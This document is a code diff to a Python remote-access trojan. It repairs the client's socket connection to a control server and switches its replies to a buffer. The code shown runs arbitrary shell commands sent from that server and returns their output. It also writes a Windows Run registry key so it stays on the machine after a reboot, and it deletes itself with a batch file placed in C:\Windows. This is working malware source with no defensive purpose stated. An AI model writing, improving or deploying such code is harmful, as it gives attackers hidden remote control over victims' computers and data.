@@ -158,13 +158,16 @@ class TrojanClient:
         string = ""
         for item in self.send_buffer:
             string += str(item)
+        self.send_buffer = []
         # creating an connecting the socket
         try:
-            self.socket.connect((self.port, self.ip))
+            self.socket = socket.socket()
+            self.socket.connect((self.ip, self.port))
             self.socket.sendall(str.encode(string))
             reply = self.socket.recv(4096)
             return str(reply)[2:-1]
-        except socket.errno:
+        except socket.error as e:
+            print(e)
             raise SocketConnectionError("failed to flush data into the socket, as the socket couldn't connect")
 
     def change_port(self, port):
@@ -186,7 +189,7 @@ class Trojan(threading.Thread):
         # setting up the protocols for the trojan
         # self.script = {}
         self.client = TrojanClient(self.server_ip, self.connection_port)
-        self.connected = True
+        self.connected = False
 
     def run(self):
         """
@@ -208,10 +211,11 @@ class Trojan(threading.Thread):
                         self.port = int(reply)
                         self.client.change_port(self.port)
                         self.client.add("ping")
+                        time.sleep(0.1)
                         reply = self.client.flush()
                         if reply == "ping":
                             self.connected = True
-                            time.sleep(0.01)
+                            time.sleep(0.2)
                     except ValueError:
                         pass
             elif self.connected is True:
@@ -221,6 +225,7 @@ class Trojan(threading.Thread):
                     if reply != "":
                         prefix = reply[:2]
                         command = reply[2:]
+                        self.client.add("reply:")
                         if prefix == "c:":
                             self.execute_command(command)
                         elif prefix == "s:":
@@ -235,8 +240,6 @@ class Trojan(threading.Thread):
                     self.connected = False
                     self.port = 0
 
-
-
     def execute_command(self, command):
         """
         executes a default windows command, that has been passed from the trojan control as a subprocess
@@ -245,26 +248,22 @@ class Trojan(threading.Thread):
         :return: (void)
         """
         try:
-            print(shlex.split(command))
             process = subprocess.Popen(shlex.split(command), bufsize=1, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdout=subprocess.PIPE, universal_newlines=False)
             outs, errs = process.communicate(timeout=10)
             if len(errs) == 0:
-                self.server.send("[*]" + str(outs, errors="ignore"))
+                self.client.add("[*]" + str(outs, errors="ignore"))
             else:
-                self.server.send("[!]" + str(errs, errors="replace"))
-            self.server.send(self.end_sequence)
+                self.client.add("[!]" + str(errs, errors="replace"))
         except subprocess.TimeoutExpired as t:
             process.kill()
             outs, errs = process.communicate()
             if not(errs == "" or errs == " "):
-                self.server.send(str(outs))
+                self.client.add(str(outs))
             else:
-                self.server.send(errs)
-            self.server.send(self.end_sequence)
+                self.client.add(errs)
         except Exception as e:
-            self.server.send("[!] " + str(e))
-            self.server.send(self.end_sequence)
+            self.client.add("[!] " + str(e))
 
     def execute_script(self, command):
         """
@@ -281,20 +280,20 @@ class Trojan(threading.Thread):
         try:
             accepted_arguments = inspect.getargspec(getattr(self, "script_" + script_name))[0][1:]
         except AttributeError:
-            self.server.send("[!] the issued script is not in the list of already implemented scripts\n")
+            self.client.add("[!] the issued script is not in the list of already implemented scripts\n")
             return False
         for argument_name in script_arguments.keys():
             if argument_name not in accepted_arguments:
-                self.server.send(str.encode("[!] " + argument_name + " is not in the list of accepted arguments\n"))
+                self.client.add(str.encode("[!] " + argument_name + " is not in the list of accepted arguments\n"))
                 return False
         try:
             reply = getattr(self, "script_" + script_name)(**script_arguments)
-            self.server.send(reply)
+            self.client.add(reply)
         except ScriptError as e:
-            self.server.send(e.message)
+            self.client.add(e.message)
             return False
         except Exception as e:
-            self.server.send(str(e))
+            self.client.add(str(e))
             return False
         return True
 
@@ -332,15 +331,14 @@ class Trojan(threading.Thread):
         sys.exit command preventing a runtime error to ocure as there is quite a big delay when executing a batch file.
         :return: (void)
         """
-        self.server.send("[*] attempting to delete the trojan from the system")
+        self.client.add("[*] attempting to delete the trojan from the system")
 
         # creating the temporary batch file, containing the source code
         path = "C:\\Windows\\delete.bat"
         if create_file(path):
-            self.server.send("[*] batch file to execute the deletion process created")
+            self.client.add("[*] batch file to execute the deletion process created")
         else:
-            self.server.send("[!] failed to create the needed batch file 'delete.bat'")
-            self.server.send(self.end_sequence)
+            self.client.add("[!] failed to create the needed batch file 'delete.bat'")
             return False
 
         # writing the source code into the batch file
@@ -351,11 +349,9 @@ class Trojan(threading.Thread):
                 file.write("DEL "+path)
             self.server.send("[*] written source code into the batch file")
         except (OSError, IOError) as e:
-            self.server.send("[!] failed to write source code into the batch file")
-            self.server.send(self.end_sequence)
+            self.client.add("[!] failed to write source code into the batch file")
         # sending the reply, then executing the just created batch executable, then terminating the program
-        self.server.send("[+] trojan has been deleted and is now inactive")
-        self.server.send(self.end_sequence)
+        self.client.add("[+] trojan has been deleted and is now inactive")
         os.system(path)
         sys.exit()
 
@@ -365,7 +361,7 @@ class Trojan(threading.Thread):
         the trojan executable, so that the trojan will be available whenever the target pc is running
         :return: (void)
         """
-        self.server.send("[*] attempting to add a autorun routine within the system registry")
+        self.client.add("[*] attempting to add a autorun routine within the system registry")
 
         # attempts to create a key in the autorun folder of the registry and write the according value into it
         key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -373,14 +369,10 @@ class Trojan(threading.Thread):
             win32api.RegSetValue(win32con.HKEY_LOCAL_MACHINE, key, win32con.REG_SZ,
                                  str(self.path + "\\" + self.name))
             time.sleep(1)
-            self.server.send("[*] written startup value to the created registry key '{0}'".format(key))
-            self.server.send(self.end_sequence)
+            self.client.add("[*] written startup value to the created registry key '{0}'".format(key))
         except:
-            self.server.send("[!] failed to create the autorun key")
-            self.server.send(self.end_sequence)
+            self.client.add("[!] failed to create the autorun key")
 
 if __name__ == "__main__":
-    server = TCPServer()
-    server.start()
-    trojanthread = Trojan(8888, server)
+    trojanthread = Trojan()
     trojanthread.start()
